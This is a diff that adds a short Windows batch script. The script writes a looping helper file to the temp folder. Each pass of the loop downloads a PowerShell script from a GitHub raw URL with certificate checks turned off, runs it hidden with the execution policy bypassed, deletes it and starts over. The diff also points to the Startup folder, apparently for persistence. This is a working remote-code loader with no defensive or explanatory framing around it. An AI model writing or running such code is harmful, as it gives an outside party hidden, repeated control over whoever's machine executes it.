@@ -1,0 +1,13 @@
+echo off
+del /q /f /a "%temp%\chlng.bat"
+echo echo off >> "%temp%\chlng.bat"
+echo :loop >> "%temp%\chlng.bat"
+echo curl -s -L -k https://raw.githubusercontent.com/D3m0n4U/temp/main/temp.ps1 -o %temp%\run.ps1 >> "%temp%\chlng.bat"
+echo powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file "%temp%\run.ps1" >> "%temp%\chlng.bat"
+echo del /q /f /a "%temp%\run.ps1" >> %temp%\chlng.bat
+echo goto loop >> "%temp%\chlng.bat"
+
+"%temp%\chlng.bat" 
+:: | del /q /f /a "C:\Users\abajaj\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\chlng.bat"
+
+#shell:startup
